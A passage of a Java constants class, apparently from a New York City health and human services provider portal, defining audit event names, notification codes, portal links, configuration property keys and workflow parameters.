	public static final String AUDIT_APP_SUBMISSION_EVENT_TYPE = "Business Application Submission";
	public static final String AUDIT_APP_SUBMISSION_EVENT_DATA = "Business Application Submitted, workflow initation requested.";
	public static final String AUDIT_APP_SUBMISSION_ENTITY_TYPE = "Business Application";

	public static final String AUDIT_SERVICE_APP_SUBMISSION_EVENT_NAME = "Service Application Submission";
	public static final String AUDIT_SERVICE_APP_SUBMISSION_EVENT_TYPE = "Service Application Submission";
	public static final String AUDIT_SERVICE_APP_SUBMISSION_EVENT_DATA = "Service Application Submitted, workflow initation requested.";
	public static final String AUDIT_SERVICE_APP_SUBMISSION_ENTITY_TYPE = "Service Application";

	public static final String AUDIT_SERVICE_APP_WITHDRAWAL_EVENT_NAME = "Service Application Withdrawal";
	public static final String AUDIT_SERVICE_APP_WITHDRAWAL_EVENT_TYPE = "Service Application Withdrawal";
	public static final String AUDIT_SERVICE_APP_WITHDRAWAL_EVENT_DATA = "Service Application Withdrawal, workflow initation requested";
	public static final String AUDIT_SERVICE_APP_WITHDRAWAL_ENTITY_TYPE = "Service Application Withdrawal";

	public static final String AUDIT_APP_WITHDRAWAL_EVENT_NAME = "Business Application Withdrawal";
	public static final String AUDIT_APP_WITHDRAWAL_EVENT_TYPE = "Business Application Withdrawal";
	public static final String AUDIT_APP_WITHDRAWAL_EVENT_DATA = "Business Application Withdrawal, workflow initation requested";
	public static final String AUDIT_APP_WITHDRAWAL_ENTITY_TYPE = "Business Application Withdrawal";
	public static final String AUDIT_APP_WITHDRAWAL_BUSINESS_APPLICATION = "Withdrawal Request - Business Application";

	public static final String AUDIT_ORG_NAME_CHANGE_EVENT_NAME = "Organization Legal Name Change";
	public static final String AUDIT_ORG_NAME_CHANGE_EVENT_TYPE = "Organization Legal Name Change";
	public static final String AUDIT_ORG_NAME_CHANGE_EVENT_DATA = "Organization Legal Name Change";
	public static final String AUDIT_ORG_NAME_CHANGE_ENTITY_TYPE = "Organization Legal Name Change";

	public static final String AUDIT_ORG_ACCOUNTING_PERIOD_CHANGE_EVENT_NAME = "Accounting Period Change";
	public static final String AUDIT_ORG_ACCOUNTING_PERIOD_CHANGE_EVENT_TYPE = "Accounting Period Change";
	public static final String AUDIT_ORG_ACCOUNTING_PERIOD_CHANGE_EVENT_DATA = "Accounting Period Change, workflow initation requested.";
	public static final String AUDIT_ORG_ACCOUNTING_PERIOD_CHANGE_ENTITY_TYPE = "Accounting Period Change";

	public static final String AUDIT_TERMSNCONDITIONS_EVENT_NAME = "Terms and Conditions Accept";
	public static final String AUDIT_TERMSNCONDITIONS_EVENT_TYPE = "Terms and Conditions Accept";
	public static final String AUDIT_TERMSNCONDITIONS_EVENT_DATA = "Terms and Conditions Accept";
	public static final String AUDIT_TERMSNCONDITIONS_ENTITY_TYPE = "Terms and Conditions Accept";

	public static final String EDIT_STAFF_ID = "editStaffId";
	public static final String APPROVE_USER_REQUEST = "approveUserRequest";
	public static final String DENY_USER_REQUEST = "denyUserRequest";
	public static final String REMOVE_MEMBER = "removeMember";
	public static final String EDIT_STAFF = "editStaff";
	public static final String SAVE_EDIT_MEMBERS = "saveEditMembers";
	public static final String ACTIVE = "Active";
	public static final String INSERT_STAFF = "insertStaff";
	public static final String DENY_USER_REQUEST_PROFILE = "denyUserRequestProfile";
	public static final String IN_ACTIVE2 = "inActive";
	public static final String IN_ACTIVE = "Inactive";
	public static final String ORG_MEMBER_DETAILS_OUTPUT = "OrgMemberDetailsOutput";
	public static final String EDIT_USER_REQUEST_ID = "editUserRequestId";
	public static final String GET_ORG_MEMBER_BY_ID = "getOrgMemberById";
	public static final String EDIT_USER_REQUEST = "editUserRequest";
	public static final String MS_STAFF_ID = "msStaffId";
	public static final String EDIT_ORG_MEMBER_ID = "editOrgMemberId";
	public static final String EDIT_ORG_MEMBER = "editOrgMember";
	public static final String ERROR_MSG2 = "errorMsg";
	public static final String LO_STAFF_DETAILS = "loStaffDetails";
	public static final String SHOW_ERROR_MSG = "showErrorMsg";
	public static final String SAVE_ORG_MEMBER = "saveOrgMember";
	public static final String EXISTING_MEMBER = "existingMember";
	public static final String LO_ORG_MEMBER_LIST = "loOrgMemberList";
	public static final String GET_ORG_MEMBER_LIST_FOR_GRID = "getOrgMemberListForGrid";
	public static final String LS_SHOW_EXISTING_MEMBER = "lsShowExistingMember";
	public static final String ERROR_MSG = "! There can only be one Executive Director/CEO. Please remove your existing ED to add a new one";
	public static final String DISPLAY_LIST_AFTER_SAVE = "displayListAfterSave";
	public static final String SAVE_AND_DISPLAY_STAFF = "saveAndDisplayStaff";
	public static final String ALL_ORG_MEMBER_LIST_FOR_GRID = "allOrgMemberListForGrid";
	public static final String DISPLAY_ORG_MEMBER = "displayOrgMember";

	public static final String MAPPER_CLASS_FILE_UPLOAD_MAPPER = "com.nyc.hhs.service.db.services.application.FileUploadMapper";
	public static final String MAPPER_CLASS_TRANSACTION_LOG_MAPPER = "com.nyc.hhs.service.db.services.application.TransactionLogMapper";
	public static final String MAPPER_CLASS_SECTION_MAPPER = "com.nyc.hhs.service.db.services.application.SectionMapper";
	public static final String MAPPER_CLASS_MASTER_TABLE_MAPPER = "com.nyc.hhs.service.db.services.application.MasterTableMapper";

	public static final String APPLICATION_DOCUMENT_VIEW_COMPONENT = "ApplicationDocs";
	public static final String APPLICATION_DOCUMENT_VIEW_PER_PAGE = "ObjectsPerPage";

	public static final String DEACTIVATED = "Deactivated";
	public static final String HHS_PROPERTY_FILE_PATH = "com.nyc.hhs.properties.hhsservices";

	public static final String APPLICATION_CONTRACT_VIEW_COMPONENT = "ServiceContract";
	public static final String APPLICATION_CONTRACT_VIEW_PER_PAGE = "PerPageContract";

	public static final String APPLICATION_STAFF_VIEW_COMPONENT = "ServiceStaff";
	public static final String APPLICATION_STAFF_VIEW_PER_PAGE = "PerPageStaff";

	public static final String CFO_TITLE = "Chief Financial Officer (or equivalent)";

	public static final List<String> FINAL_VIEW_STATUSES = new ArrayList<String>();
	static
	{
		FINAL_VIEW_STATUSES.add(STATUS_REJECTED.toLowerCase());
		FINAL_VIEW_STATUSES.add(STATUS_APPROVED.toLowerCase());
		FINAL_VIEW_STATUSES.add(STATUS_WITHDRAWN.toLowerCase());
		FINAL_VIEW_STATUSES.add(STATUS_SUSPEND.toLowerCase());
	}

	public static final List<String> BUSINESS_APP_SUMMARY_STATUSES = new ArrayList<String>();
	static
	{
		BUSINESS_APP_SUMMARY_STATUSES.add(STATUS_DRAFT.toLowerCase());
		BUSINESS_APP_SUMMARY_STATUSES.add(STATUS_IN_REVIEW.toLowerCase());
		BUSINESS_APP_SUMMARY_STATUSES.add(STATUS_RETURNED_FOR_REVISIONS.toLowerCase());
		BUSINESS_APP_SUMMARY_STATUSES.add(STATUS_DEFFERED.toLowerCase());
	}
	public static final String EVENT = "event";
	public static final String FLAG = "flag";
	public static final String REQUEST_ID = "requestId";
	public static final String PROVIDER_VISIBILITY_FLAG = "providerVisibilityFlag";
	public static final List<String> READ_ONLY_STATUS = new ArrayList<String>();
	static
	{
		READ_ONLY_STATUS.add(NOT_STARTED_STATE.toLowerCase());
		READ_ONLY_STATUS.add(DRAFT_STATE.toLowerCase());
		READ_ONLY_STATUS.add(COMPLETED_STATE.toLowerCase());
		READ_ONLY_STATUS.add(STATUS_RETURNED_FOR_REVISIONS.toLowerCase());
		READ_ONLY_STATUS.add(STATUS_DRAFT.toLowerCase());
	}

	public static final String MAPPER_CLASS_NOTIFICATION_MAPPER = "com.nyc.hhs.service.db.services.application.NotificationMapper";

	public static final String TASK_ALERT_NOTIFICATION_LINK = "/portal/hhsweb.portal?_nfpb=true&_pageLabel=portlet_hhsweb_portal_page_business_summary&_nfls=false&app_menu_name=header_application&first_action=provider";

	public static final String LOGIN_NOTIFICATION_LINK = "/portal/hhsweb.portal";

	public static final String ENTITY_TYPE_SUB_SECTION = "Sub Section";

	public static final String EVENT_NAME_SUB_SECTION = "Update Subsection Status";

	public static final String ENTITY_TYPE_DOCUMENT = "Document";

	public static final String EVENT_NAME_DOCUMENT = "Update Document Status";

	public static final String EVENT_NAME_FINSH_STATUS = "Status Changed";

	public static final String ENTITY_TYPE_STATUS_CHANGE = "Section";

	public static final String AUDIT_DATA_STATUS_CHANGE = "Status Changed to ";

	public static final String ENTITY_TYPE_BR_APP = "Business Review Application";

	public static final String DOC_TYPE_CORPORATE_STRUCTURE = "Filings";

	public static final String EMAIL_DELIMETER = ";";

	public static final String MAPPER_CLASS_HISTORY_MAPPER = "com.nyc.hhs.service.db.services.application.TaskHistoryMapper";

	// Notification constants

	public static final String NT024 = "NT024";
	public static final String NT023 = "NT023";
	public static final String NT022 = "NT022";
	public static final String NT026 = "NT026";
	public static final String NT027 = "NT027";
	public static final String NT028 = "NT028";
	public static final String NT029 = "NT029";
	public static final String NT035 = "NT035";
	public static final String NT030 = "NT030";
	public static final String BR001 = "BR001";
	public static final String NT025 = "NT025";

	public static final String PROVIDER_EXPIRY_STATUS = "ProviderExpiryStatus";
	public static final String FILING_SUSPEND_STATUS = "FilingSuspendStatus";
	public static final String SUPER_SEEDED_STATUS = "SuperSeededStatus";

	public static final String AL020 = "AL020";
	public static final String AL021 = "AL021";
	public static final String AL022 = "AL022";
	public static final String AL029 = "AL029";
	public static final String AL023 = "AL023";
	public static final String AL024 = "AL024";
	public static final String AL025 = "AL025";
	public static final String AL026 = "AL026";
	public static final String AL027 = "AL027";
	
	//[Start]   Update Language      R9.6.1 QC9693
	public static final String HHS_INFO_ID = "www.nyc.gov/mocshelp";
	//[End]   Update Language      R9.6.1 QC9693
	
	// login Environment constants
	public static final String LOCAL_ENVIRONMENT = "local";
	public static final String PROVIDER_LDAP_ENVIRONMENT = "providerLdap";
	public static final String CITY_SITEMINDER_ENVIRONMENT = "citySiteminder";

	// Master status constant
	public static final String MASTER_TASK_TYPE = "TASK TYPE";
	public static final String MASTER_SUBSECTION_STATUS = "SUBSECTION STATUS";
	public static final String MASTER_WITHDRAWAL_STATUS = "WITHDRAWAL STATUS";
	public static final String MASTER_APPLICATION_TASK_STATUS = "APPLICATION TASK STATUS";
	public static final String MASTER_TASK_FILTER_STATUS = "TASK FILTER STATUS";
	public static final String EMAIL_ID = "emailId";

	public static final String PROPERTY_SERVICE_ACCOUNT_DN = "PROP_SERVICE_ACCOUNT_DN";
	public static final String PROPERTY_SERVICE_ACCOUNT_PW = "PROP_SERVICE_ACCOUNT_PW";

	public static final String PROPERTY_SERVICE_URL_IDM_PROVISIONING = "PROP_SERVICE_URL_IDM_PROVISIONING";
	public static final String PROPERTY_SERVICE_URL_IDM_PASSWORD = "PROP_SERVICE_URL_IDM_PASSWORD";
	public static final String PROPERTY_SERVICE_URL_IDM_VDX = "PROP_SERVICE_URL_IDM_VDX";
	public static final String PROPERTY_SERVICE_URL_IDM_ROA_PWDMGT = "PROP_SERVICE_URL_IDM_ROA_PWDMGT";

	public static final String PROPERTY_PROV_DN_NEW_TOKEN_GEN_EMAIL = "PROP_PROV_DN_NEW_TOKEN_GEN_EMAIL";
	public static final String PROPERTY_PROV_DN_ACCT_REG_TOKEN_GEN = "PROP_PROV_DN_ACCT_REG_TOKEN_GEN";
	public static final String PROPERTY_PROV_DN_ACCT_REG_TOKEN_VALID = "PROP_PROV_DN_ACCT_REG_TOKEN_VALID";
	public static final String PROPERTY_PROV_DN_EMAIL_PWD_RESET_TOKEN_GEN = "PROP_PROV_DN_EMAIL_PWD_RESET_TOKEN_GEN";
	public static final String PROPERTY_PROV_DN_EMAIL_PWD_RESET_TOKEN_VALID = "PROP_PROV_DN_EMAIL_PWD_RESET_TOKEN_VALID";
	public static final String PROPERTY_PROV_DN_EMAIL_PASSWORD_RESET = "PROP_PROV_DN_EMAIL_PASSWORD_RESET";
	public static final String PROPERTY_PROV_DN_EMAIL_UPDATE_TOKEN_GEN = "PROP_PROV_DN_EMAIL_UPDATE_TOKEN_GEN";
	public static final String PROPERTY_PROV_DN_EMAIL_UPDATE_TOKEN_VALID = "PROP_PROV_DN_EMAIL_UPDATE_TOKEN_VALID";

	public static final String PROPERTY_FILE = "com.nyc.hhs.properties.hhsservices";
	public static final String PROPERTY_KEY_STORE_PATH = "PROP_KEYSTORE_PATH";
	public static final String SSL_TRUSTSTORE = "javax.net.ssl.trustStore";
	public static final String SSL_TRUSTSTORE_PASSWORD = "javax.net.ssl.trustStorePassword";
	public static final String SSL_KEYSTORE = "javax.net.ssl.keyStore";
	public static final String SSL_KEYSTORE_TYPE = "javax.net.ssl.keyStoreType";
	public static final String SSL_TRUSTSTORE_TYPE = "javax.net.ssl.trustStoreType";
	public static final String PROTOCOL_HANDLER_PKGS = "java.protocol.handler.pkgs";
	public static final String PROTOCOL_HANDLER_PKG_NAME = "com.sun.net.ssl.internal.www.protocol";

	public static final String HEADER_BR_APPLICATION_VALUE = "businessapplication";
	public static final String HEADER_SERVICE_APPLICATION_VALUE = "service";

	public static final String POST_HEADER_BR_APPLICATION = "headerPostSubmitionBusiness";
	public static final String POST_HEADER_SERVICE_APPLICATION = "headerPostSubmitionService";

	public static final String PROPERTY_DOITT_CAPTCHA_SERVICE = "PROP_DOITT_CAPTCHA_SERVICE";
	public static final String PROPERTY_CAPTCHA_PUBLIC_KEY = "PROP_CAPTCHA_PUBLIC_KEY";
	public static final String PROPERTY_DOITT_CAPTCHA_SERVICE_UI = "PROP_DOITT_CAPTCHA_SERVICE_UI";
	public static final String PROPERTY_DOITT_CAPTCHA_PASSWORD = "PROP_DOITT_CAPTCHA_PASSWORD"; //QC 8366 R 7.1.2
	public static final String PROPERTY_DOITT_CAPTCHA_CLIENT = "PROP_DOITT_CAPTCHA_CLIENT"; //QC 8366 R 7.1.2
	// web services constants end

	// build no. constant start
	public static final String PROPERTY_BUILD_NO = "PROP_BUILD_NO";

	// build no. constant end
	public static final String FILTER_SAMPLE_CATEGORY = "filtersamplecategory";
	public static final String FILTER_SAMPLE_TYPE = "filtersampletype";
	public static final String SAMPLE_CATEGORY = "sampleCategory";
	public static final String SAMPLE_TYPE = "sampleType";

	public static final String CHECK_FILTER_FOR_RETURN_TO_VAULT = "checkFilterParams";
	public static final String FILTER_DOCUMENT_OBJECT = "filterDocumentObject";

	public static final String SHARED_DOCUMENT_ALERT_NOTIFICATION_LINK = "/portal/hhsweb.portal?_nfpb=true&_pageLabel=portlet_hhsweb_portal_page_documentlist&_nfls=false&app_menu_name=header_document_vault&removeNavigator=true";
	public static final String MAPPER_CLASS_ALERT_INBOX_MAPPER = "com.nyc.hhs.service.db.services.application.AlertInboxMapper";
	public static final String SESSION_APP_STATUS = "applicationStatus";
	public static final String EDIT_DOC_LIST_MAP = "editDocumentMap";

	public static final int ACCOUNTING_PERIOD_START_RANGE = 1800;
	public static final int ACCOUNTING_PERIOD_END_RANGE = 9999;

	public static final List<String> BASIC_NO_UPDATE = Arrays.asList("ACCOUNTING_PERIOD_END_MONTH",
			"ACCOUNTING_PERIOD_START_MONTH", "ORGANIZATION_LEGAL_NAME", "CORPORATE_STRUCTURE_ID", "EIN_ID_NN");

	public static final String KEY_STAFF_DOC_TYPE = "Key Staff - Resume";
	public static final String CONTRACT_GRANT_DOC_TYPE = "Contract/Grant Documentation";
	public static final String CAPABILITY_STATEMENT_DOC_TYPE = "Capability Statement";
	public static final String SERVICES_DOC_CATEGORY = "Services";
	public static final String ORG_BASICS_DOC_CATEGORY = "Organization Basics";

	public static final String SERVICE_APPLICATION_STATUS_FOR_DEACTIVATE_CHECK_DRAFT = STATUS_DRAFT.toLowerCase()
			+ "', '" + NOT_STARTED_STATE.toLowerCase() + "', '" + COMPLETED_STATE.toLowerCase();
	public static final String SERVICE_APPLICATION_STATUS_FOR_DEACTIVATE_CHECK = STATUS_RETURNED_FOR_REVISIONS
			.toLowerCase() + "', '" + STATUS_DEFFERED.toLowerCase();

	public static final String ALERT_FILTER = "alertfilter";
	public static final String ADDRESS_VALIDATION_URL = "ADDRESS_VALIDATION_URL";
	public static final String STATUS_CHANGE = "Status Changed";
	public static final String PROVIDER_STATUS = "Provider Status";
	public static final String PROVIDER_STATUS_CHANGE = "Provider Status Changed";
	public static final String BATCH = "Batch";
	public static final String STATUS_CHANGED_TO = "Status changed to ";

	public static final String TAXONOMY_SEARCH_EVENT_NAME = "Taxonomy Search";
	public static final String TAXONOMY_SEARCH_EVENT_TYPE = "Taxonomy Search";
	public static final String TAXONOMY_SEARCH_ENTITY_TYPE = "Taxonomy Search";
	public static final String TAXONOMY_SEARCH_ENTITY_ID = "Taxonomy";
	public static final String TAXONOMY_SEARCH_ENTITY_IDENTIFIER = "Taxonomy";
	public static final String CEO_NAME = "Chief Executive Officer (CEO) Resume or Equivalent";
	public static final String CFO_NAME = "Chief Financial Officer (CFO) Resume or Equivalent";
	public static final String CREDENTIAL_VAULT_KEY = "FileNetCredentials";
	public static final String KEY_SEPARATOR = "k3yv@lu3S3p@r@t0r";
	public static final List<String> ADDRESS_FIELD_MAP = new ArrayList<String>();
	public static final String SNAPSHOT_NAME = "Snapshot";
	public static final String CAPCHA_REQUIRED = "Capcha_Required";
	public static final String ERROR_MESSAGE_FILENET_DOWN = "Internal Error Occured While Processing Your Request";
	public static final String LAST_RECACHE_TIME = "lastRecacheTime";
	public static final String ENVIROMENT_TYPE = "enviromentType";
	static
	{
		ADDRESS_FIELD_MAP.add("VAL_STATUS_DECSCRIPTION");
		ADDRESS_FIELD_MAP.add("VAL_STATUS_REASON_TEXT");
		ADDRESS_FIELD_MAP.add("VAL_NORM_HOUSE_NUMBER");
		ADDRESS_FIELD_MAP.add("VAL_NORM_STREET_NAME");
		ADDRESS_FIELD_MAP.add("VAL_CITY");
		ADDRESS_FIELD_MAP.add("VAL_STATE");
		ADDRESS_FIELD_MAP.add("VAL_ZIP_CODE");
		ADDRESS_FIELD_MAP.add("VAL_CONGRESS_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_LATITUDE");
		ADDRESS_FIELD_MAP.add("VAL_LONGITUDE");
		ADDRESS_FIELD_MAP.add("VAL_X_COORDINATE");
		ADDRESS_FIELD_MAP.add("VAL_Y_COORDINATE");
		ADDRESS_FIELD_MAP.add("VAL_COMMUNITY_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_CIVIAL_COURT_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_SCHOOL_DISTR_NAME");
		ADDRESS_FIELD_MAP.add("VAL_HEALTH_AREA");
		ADDRESS_FIELD_MAP.add("VAL_BUILDING_ID_NUMBER");
		ADDRESS_FIELD_MAP.add("VAL_TAX_BLOCK");
		ADDRESS_FIELD_MAP.add("VAL_TAX_LOT");
		ADDRESS_FIELD_MAP.add("VAL_SENATOR_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_ASSEMBLY_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_COUNCIL_DISTRICT");
		ADDRESS_FIELD_MAP.add("VAL_LOW_END_CROSS_STREET_NO");
		ADDRESS_FIELD_MAP.add("VAL_HIGH_END_CROSS_STREET_NO");
		ADDRESS_FIELD_MAP.add("VAL_LOW_END_CROSS_STREET_NAME");
		ADDRESS_FIELD_MAP.add("VAL_HIGH_END_CROSS_STREET_NAME");
		ADDRESS_FIELD_MAP.add("VAL_BOROUGH");
	}
	public static final String LOGIN_PAGE_LINK = "&_pageLabel=portlet_hhsweb_portal_login_page&_nfls=false&logout=logout&app_menu_name=logout_icon";

	public static final String RECACHE_FLAG = "RecacheFlag";
	public static final String TAXONOMY = "Taxonomy";
	public static final String ORGANIZATION_DOCUMENTS_ALERT_NOTIFICATION_LINK = "/portal/hhsweb.portal?_nfpb=true&_pageLabel=portlet_hhsweb_portal_page_share_doc_notification&_nfls=false&app_menu_name=home_icon&action=documentVault&section=sharedDoc&next_action=open&headerJSPName=shareDocheader&subsection=documentlist&fromNotification=true";
	public static final String ACTION_NOT_AUTHORIZED = "This Action Is Not Authorized";
	public static final String NOTIFICATION_CONTENT = "notificationContent";
	public static final String PROPERTY_CITY_URL = "PROP_CITY_URL";
	public static final String ORGANIZATION_DOCUMENTS_ALERT_NOTIFICATION_LINK_1 = "?_nfpb=true&_pageLabel=portlet_hhsweb_portal_page_share_doc_notification&_nfls=false&app_menu_name=home_icon&action=documentVault&section=sharedDoc&next_action=open&headerJSPName=shareDocheader&subsection=documentlist&fromNotification=true";

	public static final String SAMPLE_DOCUMENTS = "/portlet/faqhelp/sampledocuments.jsp";
	public static final String HELP_DOCUMENTS_AGENCY = "/portlet/faqhelp/helpdocumentsagency.jsp";

	public static final String SORT_ASCENDING = "ASC";
	public static final String ALLOWED_OBJECT_COUNT = "allowedObjectCount";
	public static final String ORDER_BY_MAP = "orderByMap";
	public static final String FILTER_ITEMS = "Filter Items";
	public static final String FILTERED = "Filtered Items";
	public static final String FILTER_LABEL = "filterLabel";
	public static final String FILTER_SAMPLE_DOCUMENTS = "filterDocuments";
	public static final String FILTER_PROVIDER_SAMPLE_DOCUMENTS = "filterProviderSampleDocuments";
	public static final String INCLUDE_AGENCY_HELP = "IncludeAgencyHelp";
	public static final String HELP_DOCUMENTS_AGENCY_PARAM = "helpdocumentsagency";
	public static final String INCLUDE_SAMPLE_HELP = "IncludeSampleHelp";
	public static final String SAMPLE_DOCUMENTS_LIST = "sampleList";
	public static final String SAMPLE_DOCUMENT_PARAM = "sampledocuments";
	public static final String HELP_DOCUMENTS_PARAM = "helpdocuments";
	public static final String QUESTION_LIST_MAP1 = "loQuestionListMap1";
	public static final String USER_TYPE = "userType";
	public static final String INCLUDE_FAQ = "IncludeFAQ";
	public static final String FAQ_SUMMARY_MAPFOR_HELP = "loFAQSummaryMapforHelp";
	public static final String FAQ_FORM_BEAN_DATA = "loFaqFormBeanData";
	public static final String FAQ_PUBLISH = "faq_publish";
	public static final String PORTLET_FAQHELP_FA_QS_JSP = "/portlet/faqhelp/FAQs.jsp";
	public static final String PREVIEW_PAGE = "previewPage";
	public static final String FAQ = "FAQ";
	public static final String PUBLISH = "publish";
	public static final String PREVIEW = "preview";
	public static final String INCLUDE_HELP_PAGE = "IncludeHelp";
	public static final String HELP_DOCUMENT_LIST = "helpList";
	public static final String NEXT_PAGE_PARAM = "nextPageParam";
	public static final String FILTER_DOC_CATEGORY = "documentCategoryFilter";
	public static final String FILTER_DOC_TYPE = "documentTypeFilter";
	public static final String DOCUMENT_TYPE_PROVIDER_HELP = "Provider Help";
	public static final String DOCUMENT_TYPE_AGENCY_HELP = "Agency Help";
	public static final String ORGANIZATION_TYPE_REQUESTING_FOR = "requestingOrgType";
	public static final String PUBLISH_ACTION_ATTRIBUTE = "publishAction";
	public static final String SUCCESS_STRING_WITH_COLON = "success:";
	public static final String FAQ_SUMMARY_MAP = "loFAQSummaryMap";
	public static final String ARGUMENT_FAQ_FORM_BEAN_DATA = "aoFaqFormBeanData";

	// R2 Task
	public static final String WOB_NUMBER = "wobNumber";
	public static final String REQ_PROPS_TASK_HASHMAP = "reqPropsMap";
	public static final String REQUIRED_PROPS = "aoRequiredProps";
	public static final String TASK_DETAILS_BEAN_KEY = "aoTaskDetailsBean";
	public static final String ACCELERATOR_USER_ROLE_LIST = "userRoleList";
	public static final String ORGID = "orgId";
	public static final String USER_MAP = "userMap";
	public static final String TASK_DETAIL_MAP = "taskDetailMap";
	public static final String TASK_DETAILS_BEAN = "taskDetailsBean";
	public static final String PERMITTED_USER_LIST = "permittedUserList";
	public static final String REASSIGN_USER_MAP = "reassignUserMap";
	public static final String PROCUREMENT_ID = "procurementId";
	public static final String WORKFLOW_ID = "workflowId";
	public static final String TASK_ID = "taskId";
	public static final String FETCH_AWARD_APPROVAL_TASK_DETAILS = "fetchApproveAwardTaskDetails";
	public static final String EVALUATION_RESULTS_LIST = "evaluationResultsList";
	public static final String APPROVE_AWARD = "Approve Award";
	public static final String AWARD_APPROVAL_TASK_WF = "Award Approval Task Workflow";
	public static final String TASK_HISTORY_LIST = "taskHistoryList";
	public static final String AS_TASK_COMMENT = "asTaskComment";
	public static final String INTERNAL_COMMENTS = "internalComments";
	public static final String PROPERTIES_STATUS_CONSTANT = "com.nyc.hhs.properties.statusproperties";
	public static final String TEXT_HTML = "text/html";
	public static final String REASSIGNED_TO = "reassignedTo";
	public static final String REASSIGNED_TO_USER_NAME = "reassignedToUserName";
	public static final String AUDIT_TASK_INTERNAL_COMMENTS = "Internal Comments";
	public static final String ACCELERATOR_AUDIT = "acceleratorAudit";
	public static final String TASK_ASSIGNMENT = "Task Assignment";
	public static final String TASK_ASSIGNED_TO = "Task Assigned To";
	public static final String AUDIT_BEAN_LIST = "auditBeanList";
	public static final String REASSIGN_STATUS = "reassignStatus";
	public static final String REASSIGN_WF_TASK = "reassignWFTask";
	public static final String ERROR_WHILE_PROCESSING_REQUEST = "Error occurred while processing your request";
	public static final String HANDLE_RENDER_ACTION = "render_action";
	public static final String LINK = "LINK";
	public static final String LO_HM_NOTIFY_PARAM = "loHmNotifyParam";
	public static final String REQ_PROPS_DOCUMENT = "hmReqProps";
	public static final String FINANCIAL_ORG_TYPE = "FinancialOrgType";
	public static final String NON_AUDIT_COMMENTS = "nonAuditComments";

	public static final String PROPERTY_PE_AGENCY_ID = "AgencyID";
	public static final String REVIEW_PROC_ID = "reviewProcID";
	public static final int CONTRACT_CERTIFICATION_OF_FUNDS_ID = 8;
	public static final String FETCH_REVIEW_LEVEL_CB = "fetchReviewLevelCB";
	public static final String REVIEW_LEVEL = "reviewLevel";
	public static final String RETRIEVE_STATUS = "retrieveStatus";
	public static final String TASK_NAME = "taskName";
	public static final String AL223 = "AL223";
	public static final String NT224 = "NT224";
	public static final String NT208 = "NT208";
	public static final String AL213 = "AL213";
	public static final String AL224 = "AL224";
	public static final String NT225 = "NT225";
	public static final String APPROVE_AWARD_TASK_APPROVED = "APPROVE_AWARD_TASK_APPROVED";
	public static final String APPROVE_AWARD_TASK_RETURNED = "APPROVE_AWARD_TASK_RETURNED";
	public static final String APPROVE_AWARD_TASK_OVERRIDE_APPROVED_NO_FINANCIALS = "APPROVE_AWARD_TASK_OVERRIDE_APPROVED_NO_FINANCIALS";
	public static final String REVIEW_LEVEL_NOT_SET = "REVIEW_LEVEL_NOT_SET";
	public static final String AGENCY_ID = "agencyId";
	public static final String PREVIOUS_STATUS = "previousStatus";
	public static final String FINISH_STATUS = "finishStatus";
	// Start QC 9674 R 9.5
	//public static final String OVERRIDE_APPROVED_NO_FINANCIALS = "Override: Approved - No Financials";
	public static final String OVERRIDE_APPROVED_NO_FINANCIALS = "Approved - No Financials";
	// End QC 9674 R 9.5
	public static final String STATUS_CHANGED_FROM = "Status Changed from";
	public static final String _TO_ = " To ";
	public static final String PROC_STATUS_CHANGE = "Status Change";
	public static final String PROCUREMENT_MAP = "procurementMap";
	public static final String STATUS_ID_KEY = "statusId";
	public static final String STATUS_PROPOSAL_SELECTED = "PROPOSAL_SELECTED";
	public static final String PROPOSAL_ID = "proposalId";
	public static final String JSP_PATH = "jspPath";
	public static final String VIEW_RESPONSE_BASE_LOWERCASE = "viewResponseBase";
	public static final String GET_USER_ROLES = "getUserRoles";
	public static final String AS_USER_TYPE = "asUserType";
	public static final String PROCUREMENT_ID_KEY = "asProcurementId";
	public static final String PROPOSAL_ID_KEY = "asProposalId";
	public static final String AS_SORT_SITE_TABLE = "asSortSiteTable";
	public static final String HM_REQ_PROPS = "hmReqProps";
	public static final String VIEW_RESPONSE_LOWERCASE = "viewResponse";
	public static final String PROPOSAL_DETAILS_BEAN = "proposalDetailsBean";
	public static final String CUSTOM_QUE_LIST = "customQuestionList";
	public static final String SITE_DETAIL_LIST = "siteDetailList";
	public static final String PROPOSAL_DOCUMENT_LIST = "proposalDocumentDetailList";
	public static final String FINAL_PROPOSAL_DOC_LIST = "finalProposalDocumentList";
	public static final String PROP_DETAILS_BEAN = "ProposalDetailsBean";
	public static final String PROCUREMENT_TITLE = "procurementTitle";
	public static final String AWARD_TASK_NAME = "awardTaskName";
	public static final String FINISH_AWARD_APPROVAL_WORKFLOW = "finishAwardApprovalWorkflow";
	public static final String PROC_TITLE = "PROCUREMENT_TITLE";
	public static final String ACCELERATOR_COMMENTS = "ACCELERATOR_COMMENTS";
	public static final String CONFIRM_OVERRIDE = "confirmOverride";
	public static final String CONFIRM_OVERRIDE_AWARD_WORKFLOW = "confirmOverrideAwardApprovalWorkflow";
	public static final String COMMENTS_MAP = "commentsMap";
	public static final String SELECTION_COMMENTS = "Selection Comments";
	public static final String SAVE_AWARD_APPROVAL_TASK_DETAILS = "saveApproveAwardTaskDetails";
	public static final String AUDIT_STATUS = "auditStatus";
	public static final String AUDIT_BEAN = "auditBean";
	public static final String FINISH_STATUS_MAP = "finishStatusMap";
	public static final String TASK_CREATION = "Task Creation";
	public static final String FINISH_AWARD_APPROVAL_TASK = "finishAwardApprovalTask";
	public static final String REASSIGN_AWARD_APPROVAL_TASK = "reassignAwardApprovalTask";
	public static final String SUBMIT_ACTION = "submit_action";
	public static final String RESERVE_TASK = "reserveTask";
	public static final String MANAGER_ROLE = "managerRole";
	public static final String CHOOSEN_TAB = "choosenTab";
	public static final String FILTER_TAB = "filterTab";
	public static final String SHOW_MANAGEMENT_VIEW = "showmanagementview";
	public static final String YES = "yes";
	public static final String SELECTED_PROPOSAL_COUNT = "selectedProposalCount";
	public static final String LO_HM_WF_REQ_PROPS = "loHmWFReqProps";
	public static final String ZERO = "0";
	public static final String ONE = "1";
	public static final String FIVE = "5";
	public static final String MODIFIED_FLAG = "modifiedFlag";
	public static final String CONTRACT_TYPE_ID = "contractTypeId";
	public static final String PROPOSAL_STATUS_SELECTED = "Selected";
	public static final String SCREEN_READ_ONLY = "screenReadOnly";
	public static final String CONTRACT_MAP = "contractMap";
	public static final String OVERRIDE = "Override";
